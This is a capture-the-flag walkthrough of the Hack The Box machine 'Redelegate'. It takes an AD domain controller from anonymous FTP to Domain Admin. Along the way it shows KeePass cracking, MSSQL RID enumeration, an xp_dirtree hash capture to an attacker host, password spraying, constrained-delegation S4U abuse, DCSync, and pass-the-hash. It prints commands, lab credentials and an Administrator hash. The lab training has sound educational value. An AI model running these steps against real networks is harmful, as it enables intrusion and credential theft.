

**Box:** Redelegate · **Domain:** redelegate.vl · **DC:** dc.redelegate.vl · **IP:** 10.129.234.50

**Full chain (one line):**

FTP anon → `Shared.kdbx` (download in **BINARY mode!**) → crack with a **season+year** wordlist (`Fall2024!`) → KeePass dump gives **SQLGuest** → works on **MSSQL** with `--local-auth` → from MSSQL **enumerate domain users by SID/RID** → spray `Fall2024!` → **marie.curie** → BloodHound: Helpdesk can **ForceChangePassword** → **helen.frost** (WinRM + `SeEnableDelegationPrivilege` + `GenericAll` over **FS01**) → set up **constrained delegation** on FS01 → **S4U** ticket impersonating **DC$** for `ldap/dc` → **DCSync** → Administrator hash → `wmiexec` = **root**.

> This box teaches three things the Academy only half-covers: (1) you can **enumerate a whole domain's users through a low-priv MSSQL login** using SID math, (2) **`SeEnableDelegationPrivilege` + control of a computer = you can *build* constrained delegation** and ride it to Domain Admin, and (3) **don't ignore the "binary mode" FTP warning** or you waste an hour cracking a corrupted file. The skill: *when a cred/edge looks like a dead end, combine it with the one privilege you're holding.*

---

## Phase 1 — Recon

```bash
nmap -p- --min-rate 10000 10.129.234.50        # then -sCV on the open ports
```

Open ports read like a **Domain Controller**: 21 FTP, 53 DNS, 88 Kerberos, 135/139/445 SMB-RPC, 389/636/3268 LDAP, **1433 MSSQL (2019)**, 3389 RDP, 5985 WinRM, plus the usual high RPC range. The three web ports (IIS) returned nothing.

```bash
echo '10.129.234.50 redelegate.vl dc.redelegate.vl DC dc' | sudo tee -a /etc/hosts

sudo ntpdate 10.129.234.50        # keep your clock in sync — Kerberos breaks if skew > 5 min
```

```bash
nxc smb 10.129.234.50 -u '' -p ''        # Null Auth: True — anonymous can bind
nxc smb 10.129.234.50 -u '' -p '' --shares
```

The null session **binds** (you see the domain name) but share listing fails:

```
[-] Error enumerating shares: STATUS_ACCESS_DENIED
```

> **Why ACCESS_DENIED on shares?** "Null auth = true" only means an anonymous bind is *allowed*; it doesn't give anonymous any *rights*. A hardened 2022 DC won't let a nobody list shares. You're logged in as no one, so you can read almost nothing. That's normal — don't fight it, find another door. Here the door is **FTP**.

---

## Phase 2 — FTP anonymous → KeePass → `Fall2024!`

```bash
nxc ftp 10.129.234.50 -u anonymous -p ''        # anonymous login allowed
```

Three files on the FTP: `CyberAudit.txt`, `TrainingAgenda.txt`, `Shared.kdbx`.

- **`CyberAudit.txt`** — an audit saying "weak passwords, excessive privileges, unused AD objects, dangerous ACLs" were found and some fixes are only *"IN PROGRESS"*. That's the box telling you exactly what it's vulnerable to.
- **`TrainingAgenda.txt`** — a training schedule. The 18th Oct session *"Why 'SeasonYear!' is not a good password"* had only **7 attendees**. Translation: most staff still use a `Season` + `Year` + `!` password. **That's the wordlist hint.**
- **`Shared.kdbx`** — a KeePass password database.

### The "binary mode" lesson (this cost me an hour)

The interactive FTP client defaults to **ASCII mode**, which rewrites line endings. That's fine for text, but it **corrupts binary files** like `.kdbx`. If you download the database in ASCII mode, it will *never* crack because the bytes are mangled. Flip to binary first:

```bash
# inside the ftp> prompt:
binary          # 200 Type set to I.  — switch to raw byte transfer
prompt off      # don't ask y/n for each file
get Shared.kdbx
```

> **Lesson:** when a KeePass/ZIP/image "won't crack" or "won't open," re-download it in **binary** mode before you blame the password. A corrupted file fails silently.

### Crack the KeePass master password (custom wordlist)

Find the extractor, turn the DB into a hash, then crack with hashcat (not john — mode **13400** = KeePass):

```bash
find / -type f -name '*keepass2john*' 2>/dev/null        # → /usr/sbin/keepass2john

keepass2john Shared.kdbx > kp.hash
```

Build the **Season+Year!** list the training agenda hinted at (files are dated 2024, so centre the years there):

```bash
for s in Spring Summer Autumn Fall Winter; do for y in {2020..2025}; do echo "${s}${y}!"; done; done | sort -u > seasons.txt
```

```bash
hashcat -m 13400 kp.hash seasons.txt --username        # → Fall2024!
```

> **Why a custom list, not rockyou?** KeePass here uses **600000** KDF iterations — every guess is deliberately slow, so a 14-million-word list would take forever. The box *gave you the pattern* (SeasonYear!), so a tiny targeted list cracks it in seconds. **Slow hash + a known pattern = make a small targeted wordlist.** Big online lists are only a fallback if the hint-based list fails.

### Dump the entries

```bash
echo 'Fall2024!' | keepassxc-cli export Shared.kdbx --format csv
```

```
TITLE               | USERNAME        | PASSWORD
FTP                 | FTPUser         | SguPZBKdRyxWzvXRWy6U
FS01 Admin          | Administrator   | Spdv41gg4BlBgSYIW1gF
WEB01               | WordPress Panel | cn4KOEgsHqvKXPjEnSD9
SQL Guest Access    | SQLGuest        | zDPBpaF4FywlqIv11vii
KeyFob Combination  |                 | 22331144
Timesheet Manager   | Timesheet       | hMFS4I0Kj8Rcd62vqi5X
Payrol App          | Payroll         | cVkqz4bCM7kJRSNlgx2G
```

---

## Phase 3 — Spray the looted creds → SQLGuest on MSSQL

Put the usernames and passwords into two files and spray **every service, both domain and local auth**. Domain auth failed for everything — the trap is stopping there.

```bash
nxc smb   dc.redelegate.vl -u users -p passwds --continue-on-success                 # nothing
nxc smb   dc.redelegate.vl -u users -p passwds --continue-on-success --local-auth    # nothing
nxc ldap  dc.redelegate.vl -u users -p passwds --continue-on-success                 # nothing
nxc winrm dc.redelegate.vl -u users -p passwds --continue-on-success                 # nothing
nxc mssql dc.redelegate.vl -u users -p passwds --continue-on-success --local-auth    # HIT
```

```
MSSQL   dc.redelegate.vl   1433   DC   [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii
```

>  "should I always check both IP and FQDN with `--local-auth`?"** The thing that mattered here isn't IP vs FQDN, it's **domain auth vs `--local-auth`**. `SQLGuest` is a **SQL login local to the MSSQL instance**, not a domain account — so domain auth fails and `--local-auth` succeeds. **Rule: when a looted cred fails, retry it (a) on every protocol and (b) with `--local-auth`.** A cred useless on SMB can be a live login on MSSQL. (Use the FQDN by habit for Kerberos stuff; for plain local auth either works.)

Connect:

```bash
impacket-mssqlclient 'redelegate.vl/SQLGuest:zDPBpaF4FywlqIv11vii@10.129.234.50'
```

---

## Phase 4 — MSSQL enumeration (who am I, what can I do)

First, figure out who you are and whether you have power. Each line, commented with *what it tells you*:

```sql
SELECT @@version;                       -- MSSQL version + Windows build
SELECT @@SERVERNAME;                    -- the server's name
SELECT SYSTEM_USER;                     -- the login you authenticated as (here: SQLGuest)
SELECT USER_NAME();                     -- your mapped DB user in the CURRENT database (often 'guest')
SELECT ORIGINAL_LOGIN();                -- the login you FIRST connected as (survives EXECUTE AS)
SELECT DB_NAME();                       -- the database you're currently in
SELECT name FROM master..sysdatabases;  -- list every database on the server
```

Am I an admin, and can I promote myself?

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');            -- 1 = I'm sysadmin (god), 0 = no, NULL = can't tell
EXEC sp_addsrvrolemember 'SQLGuest','sysadmin'; -- try to add myself to sysadmin (fails without rights)
```

Full privilege sweep (keep this block — it's a reusable MSSQL checklist):

```sql
SELECT IS_SRVROLEMEMBER('securityadmin'), IS_SRVROLEMEMBER('serveradmin'), IS_SRVROLEMEMBER('setupadmin'), IS_SRVROLEMEMBER('processadmin'), IS_SRVROLEMEMBER('dbcreator'), IS_SRVROLEMEMBER('bulkadmin');

SELECT * FROM fn_my_permissions(NULL,'SERVER');     -- my server-level rights (look for CONTROL SERVER, IMPERSONATE ANY LOGIN)

SELECT * FROM fn_my_permissions(NULL,'DATABASE');   -- my rights in the current DB

SELECT IS_MEMBER('db_owner'), IS_MEMBER('db_datareader'), IS_MEMBER('db_datawriter'), IS_MEMBER('db_ddladmin');
```

Result here: **not sysadmin, no useful roles, can't self-promote.** Look through the databases (incl. `msdb` backups) for secrets:

```sql
USE msdb;
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE';

SELECT database_name, physical_device_name FROM dbo.backupset b JOIN dbo.backupmediafamily m ON b.media_set_id=m.media_set_id ORDER BY backup_start_date DESC;   -- backups can leak file paths/creds
```

Nothing useful. Command execution is blocked too:

```sql
EXEC xp_cmdshell 'whoami';   -- "User does not have permission to perform this action."
```

### One trick a low-priv login still has: steal the service account's hash

`xp_dirtree` makes the **MSSQL service account** reach out to a UNC path. Point it at your box running Responder and you capture its **NTLMv2**:

```bash
sudo responder -I tun0
```

```sql
EXEC master..xp_dirtree '\\10.10.14.5\share\';   -- MSSQL service auths to you → Responder grabs sql_svc's NTLMv2
```

Got `sql_svc`'s NTLMv2 hash — but it **wouldn't crack** (strong service password). Dead end *for exec*. But MSSQL still has one more gift: it can tell us the **whole domain's user list**. 👇

*(Refs I used here: the CPTS **Footprinting** + **Attacking Common Services** notes, and NetSPI's MSSQL domain-account enumeration post.)*

---

## Phase 5 — MSSQL → enumerate ALL domain users by SID/RID

This is the clever bit. A **low-privilege** SQL login can translate between account **names** and **SIDs** using two built-in functions:

- `SUSER_SID('DOMAIN\name')` → returns that account's **SID** (as bytes)
- `SUSER_SNAME(<sid-bytes>)` → returns the **name** for a SID

So if we can build valid SIDs ourselves, we can ask MSSQL "who is this?" for every account — no admin needed.

### What a SID / RID actually is (plain words)

A SID looks like `S-1-5-21-<domain part>-<RID>`. In binary it's just a blob of bytes.

- The **domain part** is **identical for every object in the domain**.
- Only the **last 4 bytes — the RID** — change per account. (Administrator = RID 500, Guest = 501, krbtgt = 502, built-in groups 512–579, and **every account the admins create starts at 1000** and counts up.)

So the plan is: **learn the shared domain prefix once, then just swap the last 4 bytes (the RID) and ask MSSQL for the name.**

### Step 1 — get the domain's base SID

Ask for the SID of something whose RID you already know. "Domain Admins" is **always RID 512**:

```sql
SELECT SUSER_SID('REDELEGATE\Domain Admins');
-- → 0x010500000000000515000000a185deefb22433798d8e847a 00020000
```

That trailing `00020000` is **512 written backwards** (little-endian). Chop those last 4 bytes off and you have the **base SID shared by everyone** in the domain:

```
base = 010500000000000515000000a185deefb22433798d8e847a
```

### Step 2 — "swap and pad" the RID, then look it up

To look up account **#500**, glue `base` + `500-as-4-bytes` together and call `SUSER_SNAME`:

```sql
SELECT SUSER_SNAME(0x010500000000000515000000a185deefb22433798d8e847a F4010000);
-- → REDELEGATE\Administrator
```

**Why `F4010000` and not `000001F4`?** 500 in hex is `0x1F4`. Computers store that 4-byte number **backwards (little-endian) and padded to a full 4 bytes**:
- `0x1F4` → pad to 4 bytes → `00 00 01 F4` → reverse the byte order → `F4 01 00 00` → `F4010000`.

That reverse-and-pad is literally all "**swap the byte order and pad with 0s**" means. In Python it's one call:

```bash
python3 -c "import struct; print(struct.pack('<I', 1105).hex())"   # RID 1105 → 51040000
```

### Step 3 — loop the RIDs and collect names

#### Option 1: Msfconsole


```bash
# Metasploit — the easy button:
msfconsole -q -x "use auxiliary/admin/mssql/mssql_enum_domain_accounts; set RHOSTS dc.redelegate.vl; set USERNAME SQLGuest; set PASSWORD zDPBpaF4FywlqIv11vii; set USE_WINDOWS_AUTHENT false; run"
```

> **"when should I know to reach for the MSF trick?"** When you become sure after getting the result in step 2. Here the MSF module logs in **once**, fuzzes thousands of RIDs, and even prints the base domain SID for you. **Repetitive network loop = look for a native module first.**

#### Option 2 : Manual

```bash
#!/bin/bash

check_rid() {
    SID_BASE="010500000000000515000000a185deefb22433798d8e847a"
    local RID=$1
    local HEX_RID=$(python -c "import struct; print(struct.pack('<I', ${RID}).hex())")
    local SID="${SID_BASE}${HEX_RID}"
    local RES=$(mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -file <( echo "select SUSER_SNAME(0x${SID});") 2>&1 | sed -n '/^----/{n;p;}')

    if [[ "$(echo "$RES" | xargs)" != "NULL" ]]; then echo "${RID}: ${RES}"; fi
}

export -f check_rid 
seq 1000 1500 | xargs -P 48 -I{} bash -c 'check_rid $@' _ {}
```


> **Your question — "why only RID 1000–1500?"** Because Windows assigns RIDs **in order**, and the fixed built-ins (Administrator 500, Guest 501, krbtgt 502, built-in groups 512–579) all live **below 1000**. Every *human* account the admins created starts at **1000** and climbs. `1500` is just a sensible ceiling — a small lab won't have 500 objects, and here every hit landed between **1000 and 1119**. You skip <1000 (boring built-ins) and don't bother far above (empty). **Low RIDs = built-in, 1000+ = real users.**

### Speed: manual vs parallel vs Metasploit (the "which tool" lesson)

| Method                 | How                                 | Time        |
| ---------------------- | ----------------------------------- | ----------- |
| Parallel `xargs -P 48` | 48 workers                          | **~13 s**   |
| **Metasploit module**  | one login, does it all              | **fastest** |

Either way you get a clean list of real domain users (marie.curie, helen.frost, mallory.roberts, …).

---

## Phase 6 — Spray `Fall2024!` across the real users → marie.curie

You already know the season password cracked the KeePass — try it against the **domain users** you just enumerated (this time **domain** auth, not local):

```bash
nxc smb dc.redelegate.vl -u domain_users.txt -p 'Fall2024!' --continue-on-success | grep -v STATUS_LOGON_FAILURE
```

```
[+] redelegate.vl\marie.curie:Fall2024!
```

> - *"Try nxc on other services for found creds?"* — **Yes, always.** Once you have a user, re-spray it across `smb winrm rdp ldap mssql ftp` to see where it can log in and what it unlocks. That's how you learn a cred's *real* value.
> - *"If the custom list hadn't worked, would I brute force with big wordlists?"* — For a **domain account** (no lockout risk if you spray one password at a time) you could escalate to bigger lists. But the box handed you the pattern twice (training agenda + the already-cracked `Fall2024!`), so reuse beats brute force. Watch for `STATUS_ACCOUNT_RESTRICTION` on an account like `mallory.roberts` — that often marks a **privileged/protected** account, note it and move on.

---

## Phase 7 — BloodHound: find the path from marie

```bash
bloodhound-python -d redelegate.vl -u marie.curie -p 'Fall2024!' -ns 10.129.234.50 -dc dc.redelegate.vl -c All --zip
```

Mark marie as owned, run "shortest paths from owned". The chain:

- **marie.curie ∈ Helpdesk** → Helpdesk can **ForceChangePassword** on several users, including **helen.frost**.
- **helen.frost ∈ Remote Management Users** → she can **WinRM to the DC**.
- helen also holds **`GenericAll` over the computer `FS01`** (FS01 ∈ Domain Computers).

Owning FS01 looks like a **dead end** at first (it's just a member computer) — park that thought, it becomes the whole endgame once we see helen's privilege.

---

## Phase 8 — marie → helen.frost (ForceChangePassword) → WinRM

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u marie.curie -p 'Fall2024!' set password helen.frost 'NewPass123!'
```

```bash
nxc winrm 10.129.234.50 -u helen.frost -p 'NewPass123!'        # (Pwn3d!)
evil-winrm -i dc.redelegate.vl -u helen.frost -p 'NewPass123!'
```

Enumerating her files finds nothing — but her **privileges** are the prize:

```powershell
whoami /priv
# SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation   Enabled
```

---

## Phase 9 — Delegation endgame → Domain Admin

### What is `SeEnableDelegationPrivilege`? 

**Delegation** = letting one account do work **"on behalf of" another user** (impersonate them) to reach a service. Turning delegation **on** for an account is normally a **Domain-Admin-only** change. `SeEnableDelegationPrivilege` is the special right that lets its holder **flip those delegation switches**.

So helen can't read the DC directly — but she **can configure an account to be allowed to impersonate people**. That is the escape hatch. And helen *also* controls a computer (FS01 via GenericAll). Put those two together and you can **build** delegation from scratch and impersonate a Domain Admin.

> **Can my kit tools do this?** Yes — the whole thing is **bloodyAD + impacket** (0xdf did the setup with PowerShell inside WinRM; bloodyAD does the same over LDAP, and it works because it runs *as helen*, so her `SeEnableDelegationPrivilege` applies).

### The 3 types of delegation — check them one by one, use the one that works

| Type | Who holds it / what's set | How to check | Available here? |
|---|---|---|---|
| **Unconstrained** | account stores *any* user's TGT; UAC flag `TRUSTED_FOR_DELEGATION` | BloodHound "Unconstrained Delegation"; look for the flag | **No** — you'd need a new computer + DNS coercion, but `MachineAccountQuota = 0` and no DNS write |
| **Constrained** | account may impersonate users to **specific SPNs** (`msDS-AllowedToDelegateTo`); with protocol transition = flag `TRUSTED_TO_AUTH_FOR_DELEGATION` | check `msDS-AllowedToDelegateTo` on accounts | **YES** — helen can *set* the flag (`SeEnableDelegationPrivilege`) **and** controls FS01 (`GenericAll`) |
| **Resource-Based (RBCD)** | the **target** says who may impersonate to it (`msDS-AllowedToActOnBehalfOfOtherIdentity` on the target) | who can *write* that attr on the DC? | **No** — we have no write on the DC's attribute |

**Check them with commands (run as helen.frost):**

First, one shot — does any *already-configured* delegation exist that I can abuse?

```bash
impacket-findDelegation 'redelegate.vl/helen.frost:NewPass123!' -dc-ip 10.129.234.50   # lists existing Unconstrained / Constrained / RBCD across the domain
```

Read the raw attributes per type (bloodyAD LDAP searches — the `:1.2.840.113556.1.4.803:` bit is a bitwise-AND match on userAccountControl):

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' --attr sAMAccountName                    # UNCONSTRAINED (TRUSTED_FOR_DELEGATION = 0x80000)

bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' get search --filter '(msDS-AllowedToDelegateTo=*)' --attr sAMAccountName,msDS-AllowedToDelegateTo                 # CONSTRAINED

bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' get search --filter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' --attr sAMAccountName                         # RBCD already set somewhere
```

nxc quick checks:

```bash
nxc ldap dc.redelegate.vl -u helen.frost -p 'NewPass123!' --trusted-for-delegation   # unconstrained accounts

nxc ldap dc.redelegate.vl -u helen.frost -p 'NewPass123!' -M maq                      # MachineAccountQuota — can I even add a computer? (needed for the unconstrained route)
```

Nothing pre-made is abusable here, so the real question is **"which type can I *build*?"** — decided by two checks:

```bash
whoami /priv    # in helen's WinRM shell → SeEnableDelegationPrivilege present = I can switch delegation flags ON → CONSTRAINED is possible

bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' get writable --detail   # what can I control? → GenericAll over FS01 = an account to put the delegation on
```

Line each type up against what the checks returned:

- **Unconstrained?** needs a computer with `TRUSTED_FOR_DELEGATION` that I control. `-M maq` shows `MachineAccountQuota = 0` (can't add one) and no DNS-write to coerce the DC → ❌
- **RBCD?** needs *write* on a target's `msDS-AllowedToActOnBehalfOfOtherIdentity` that the DC trusts. `get writable` shows only FS01, a plain member computer → ❌
- **Constrained?** needs `SeEnableDelegationPrivilege` (✅ from `whoami /priv`) **and** an account to configure (✅ GenericAll over FS01) → **✅ use this one.**

So: Unconstrained ❌ (MAQ 0, no DNS), RBCD ❌ (no write on DC) → **Constrained delegation ✅**.

> **"helen has GenericAll over FS01, so why not just change FS01's password and be done? Why bother with delegation?"**
> Because **owning FS01 by itself is worthless.** `GenericAll` only makes you control the **FS01 *computer account*** — and FS01 is just an ordinary member of Domain Computers with **zero rights on the DC** (you can't even log into the real FS01 host — that's the dead end you hit). Changing its password gets you *nothing* on its own.
> FS01 only becomes dangerous when you **add a delegation right to it**: *"FS01 is allowed to impersonate anyone to the DC's LDAP service."* That switch is exactly what **only `SeEnableDelegationPrivilege` can turn on.** So you need **both**: `GenericAll` → know/reset FS01's password (to request tickets as FS01); `SeEnableDelegationPrivilege` → grant FS01 the impersonation power. One without the other is a dead end — that's the whole point of the box's name, *Re-delegate*.

### Step 1 — reset FS01$ password (GenericAll) so you can use it

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' set password 'FS01$' 'NewPass123!'
```

### Step 2 — configure constrained delegation on FS01 (needs helen's privilege)

```bash
bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' add uac 'FS01$' -f TRUSTED_TO_AUTH_FOR_DELEGATION

bloodyAD --host 10.129.234.50 -d redelegate.vl -u helen.frost -p 'NewPass123!' set object 'FS01$' msDS-AllowedToDelegateTo -v 'ldap/dc.redelegate.vl'
```

- Line 1 sets the **protocol-transition** flag (`TRUSTED_TO_AUTH_FOR_DELEGATION`) — lets FS01 request tickets for users who **never actually logged in**. (This is the part that *requires* `SeEnableDelegationPrivilege`.)
- Line 2 points FS01's allowed delegation at **`ldap/dc.redelegate.vl`** — "FS01 may act as the DC's LDAP service."

*(0xdf's PowerShell equivalents, run as helen in WinRM: `Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True` and `Set-ADObject -Identity "CN=FS01,CN=Computers,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}`.)*

### Step 3 — S4U: get a ticket as DC$ to the DC's LDAP

```bash
impacket-getST 'redelegate.vl/FS01$:NewPass123!' -spn ldap/dc.redelegate.vl -impersonate dc
```

What the two steps inside this command do (in plain words):
- **S4U2Self** — FS01 asks the DC: *"give me a ticket to myself, as if the account `dc` had requested it."* Protocol transition is what lets FS01 do this for a user who never signed in.
- **S4U2Proxy** — FS01 takes that ticket and asks: *"now give me a ticket to `ldap/dc.redelegate.vl`, on behalf of `dc`."* The DC allows it because FS01's `msDS-AllowedToDelegateTo` lists exactly that SPN.
- **Result:** a Kerberos ticket that authenticates to the DC's **LDAP** service **as the DC machine account `DC$`**, saved to `dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache`.

> **Why impersonate `dc` (the DC$ machine account)?** Because **DC$ holds replication rights** — it can **DCSync**. A ticket as DC$ to LDAP is enough to replicate every secret. (Impersonating `Administrator` can be blocked if it's in **Protected Users**; DC$ is the reliable powerful target.)

### Step 4 — DCSync with the ticket, then shell as Administrator

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
impacket-secretsdump -k -no-pass dc.redelegate.vl
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
```

Pass-the-hash for a shell and the flag:

```bash
impacket-wmiexec redelegate.vl/administrator@dc.redelegate.vl -hashes :ec17f7a2a4d96e177bfd101b94ffc0a7
# or: evil-winrm -i dc.redelegate.vl -u administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
```

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

👑 **Domain Admin / root.**

---

## Full chain (one glance)

```
FTP anon → Shared.kdbx (BINARY mode!) → keepass2john + hashcat -m 13400 (season list) → Fall2024!
  │ keepassxc-cli export
SQLGuest : zDPBpaF4FywlqIv11vii
  │ nxc mssql --local-auth  (domain auth fails; local wins)
MSSQL as SQLGuest → not sysadmin, xp_cmdshell denied
  │ SUSER_SID('DOMAIN\Domain Admins') → base SID ; loop RID 1000-1500 + SUSER_SNAME  (MSF module = fastest)
domain user list → spray Fall2024! → marie.curie
  │ BloodHound: Helpdesk ForceChangePassword
helen.frost (NewPass123!) → WinRM Pwn3d  +  SeEnableDelegationPrivilege  +  GenericAll FS01
  │ reset FS01$  +  add TRUSTED_TO_AUTH_FOR_DELEGATION  +  msDS-AllowedToDelegateTo = ldap/dc
impacket-getST -spn ldap/dc.redelegate.vl -impersonate dc   (S4U2Self → S4U2Proxy, ticket as DC$)
  │ KRB5CCNAME → secretsdump -k  (DCSync)
Administrator NT hash → wmiexec / evil-winrm (PtH)  → root.txt  👑
```

## Takeaways

1. **Download binaries in FTP BINARY mode.** ASCII mode silently corrupts `.kdbx`/zip/images — a file that "won't crack" may just be mangled. Re-download before you blame the password.
2. **Let the box hint the wordlist.** A training agenda about "SeasonYear!" + 2024 files → a tiny `Season+Year!` list cracks a slow KeePass (600k iterations) in seconds. Targeted beats rockyou for slow KDFs.
3. **A failed cred isn't dead — retry with `--local-auth` and on every protocol.** `SQLGuest` was a *local* SQL login; only `nxc mssql --local-auth` found it.
4. **A low-priv MSSQL login can enumerate the whole domain** via `SUSER_SID`/`SUSER_SNAME`: get the base SID from a known-RID object (Domain Admins = 512), then swap+pad RIDs 1000–1500 (little-endian, 4 bytes) and resolve names.
5. **Repetitive per-item network loop crawling? Reach for a native tool/MSF module.** `auxiliary/admin/mssql/mssql_enum_domain_accounts` did in seconds what a login-per-RID bash loop did in 7 minutes.
6. **`SeEnableDelegationPrivilege` = you can *build* delegation.** Combined with control of a computer (GenericAll), you configure **constrained delegation** and impersonate your way to DA. Neither piece is enough alone — that's why GenericAll on FS01 *by itself* was a dead end.
7. **Check all 3 delegation types before committing:** unconstrained (needs a new computer/DNS — blocked by MAQ 0), RBCD (needs write on the target — blocked), constrained (we could create it — ✅).
8. **S4U → impersonate `DC$` → DCSync.** The DC machine account has replication rights, so a ticket as `DC$` to `ldap/dc` is all `secretsdump -k` needs. Admin can be blocked by Protected Users; DC$ isn't.

[0xdf — HTB Redelegate walkthrough](https://0xdf.gitlab.io/2025/07/17/htb-redelegate.html) · [NetSPI — Enumerating Domain Accounts via MSSQL](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
